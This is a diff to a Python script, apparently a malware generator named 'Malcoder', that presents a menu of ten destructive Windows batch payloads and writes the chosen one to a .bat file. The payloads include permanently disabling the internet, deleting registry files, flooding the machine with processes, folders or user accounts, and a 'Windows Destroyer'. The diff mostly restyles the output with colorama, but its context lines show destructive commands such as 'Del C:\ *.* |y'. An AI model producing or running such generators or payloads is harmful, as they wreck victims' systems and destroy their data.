@@ -1,31 +1,46 @@
-
-
+#!/usr/bin/env python3
 import os
 import time
 import convertor
 from prettytable import PrettyTable
+from colorama import Fore
+import colorama
 import platform
-##############################################################################
-#colour 
-RED='\033[31m'
-BLUE='\033[34m'
-RE='\033[0m'
-YELLOW='\033[93m'
-GREEN='\033[32m'
+
+colorama.init()
+###############################################################################
+banner=Fore.MAGENTA +'''
+
+                     ██████   ██████           ████                        █████                   
+                    ░░██████ ██████           ░░███                       ░░███                    
+                     ░███░█████░███   ██████   ░███   ██████   ██████   ███████   ██████  ████████ 
+                     ░███░░███ ░███  ░░░░░███  ░███  ███░░███ ███░░███ ███░░███  ███░░███░░███░░███
+                     ░███ ░░░  ░███   ███████  ░███ ░███ ░░░ ░███ ░███░███ ░███ ░███████  ░███ ░░░ 
+                     ░███      ░███  ███░░███  ░███ ░███  ███░███ ░███░███ ░███ ░███░░░   ░███     
+                     █████     █████░░████████ █████░░██████ ░░██████ ░░████████░░██████  █████    
+                    ░░░░░     ░░░░░  ░░░░░░░░ ░░░░░  ░░░░░░   ░░░░░░   ░░░░░░░░  ░░░░░░  ░░░░░     
+'''+Fore.RESET
+credit=Fore.CYAN+'''                                                        
+                                                                            v1.1
+                                                                           Author:Bot-Coder
+                                                                           Github:https://github.com/BOT-CODER
+                                                                           Please contact us in github Pag
+
+'''+Fore.RESET
 
 ##############################################################################
 #table
 table=PrettyTable(['Id','Name','Function','Level'])
-table.add_row(['1','Disable Internet Permanently','This code will disable the internet connectivity permanently',RED+'Medium risk'+RE])
-table.add_row(['2','Delete Key Registry Files','This will delete key registry files, then loops a message',RED+'High risk'+RE])
-table.add_row(['3','Endless Notepads','This will pop up endless notepads until the computer freezes and crashes',BLUE+'Medium risk'+RE])
-table.add_row(['4','Popping CD Drives','This will make the CD drives constantly pop out',YELLOW+'low risk'+RE])
-table.add_row(['5','Endless Enter','This will make the enter button pressed continuously',BLUE+'Medium risk'+RE])
-table.add_row(['6','Application Bomber','It will start to open different applications repeatedly ',BLUE+'Medium risk'+RE])
-table.add_row(['7','Folder Flooder','This will create unlimited no. of folders.',BLUE+'Medium risk'+RE])
-table.add_row(['8','User Account Flooder','This will create large no. of the user account ',BLUE+'Medium risk'+RE])
-table.add_row(['9','Process Creator','This will create unlimited background processes',BLUE+'Medium risk'+RE])
-table.add_row(['10','Windows Destroyer','This will delete your whole C:\ drive and it really unrecoverable',RED+'High risk'+RE])
+table.add_row(['1','Disable Internet Permanently','This code will disable the internet connectivity permanently',Fore.BLUE+'Medium risk'+Fore.RESET])
+table.add_row(['2','Delete Key Registry Files','This will delete key registry files, then loops a message',Fore.RED+'High risk'+Fore.RESET])
+table.add_row(['3','Endless Notepads','This will pop up endless notepads until the computer freezes and crashes',Fore.BLUE+'Medium risk'+Fore.RESET])
+table.add_row(['4','Popping CD Drives','This will make the CD drives constantly pop out',Fore.YELLOW+'low risk'+Fore.RESET])
+table.add_row(['5','Endless Enter','This will make the enter button pressed continuously',Fore.BLUE+'Medium risk'+Fore.RESET])
+table.add_row(['6','Application Bomber','It will start to open different applications repeatedly ',Fore.BLUE+'Medium risk'+Fore.RESET])
+table.add_row(['7','Folder Flooder','This will create unlimited no. of folders.',Fore.BLUE+'Medium risk'+Fore.RESET])
+table.add_row(['8','User Account Flooder','This will create large no. of the user account ',Fore.BLUE+'Medium risk'+Fore.RESET])
+table.add_row(['9','Process Creator','This will create unlimited background processes',Fore.BLUE+'Medium risk'+Fore.RESET])
+table.add_row(['10','Windows Destroyer','This will delete your whole C:\ drive and it really unrecoverable',Fore.RED+'High risk'+Fore.RESET])
 #################################################################################
 #operting system finder
 sys=platform.system()
@@ -37,9 +52,12 @@ elif sys == "Linux":
 #getting id
 try:
     while True:
+        os.system(cmd)
+        print(banner)
+        print(credit)
         print(table)
-        print(RED+" Press Ctrl+c exit from script"+RE)
-        id=input(GREEN+"Enter The Id You Want:"+RE)
+        print(Fore.CYAN+"Press "+Fore.LIGHTRED_EX+"Crtl+C"+Fore.CYAN+" to exit from script"+Fore.RESET)
+        id=input(Fore.GREEN+"Enter The Id You Want:"+Fore.RESET)
         if id=="1":
             code ='''
 echo @echo off>c:windowswimn32.bat        
@@ -138,8 +156,6 @@ goto x
 Del C:\ *.* |y
 '''
             name="Windows Destroyer"
-            print(id)
-           
         else:
             print("Invaild Id")
             exit()
@@ -148,12 +164,12 @@ Del C:\ *.* |y
         check=os.path.exists(name+'.bat')
         time.sleep(1)
         if check == True:
-            print("successful")
+            print(Fore.GREEN+"successful"+Fore.RESET)
         elif check == False:
-            print("failed")
+            print(Fore.RED+"failed"+Fore.RESET)
         time.sleep(1)
-        input(RED+'Press Enter to reload the script'+RE)
+        input(Fore.LIGHTRED_EX+'Press Enter to reload the script'+Fore.RESET)
         time.sleep(1)
         os.system(cmd)
 except Exception:
-    print(RED+"Something Went Wrong"+RE)
+    print(Fore.RED+"Something Went Wrong"+Fore.RESET)
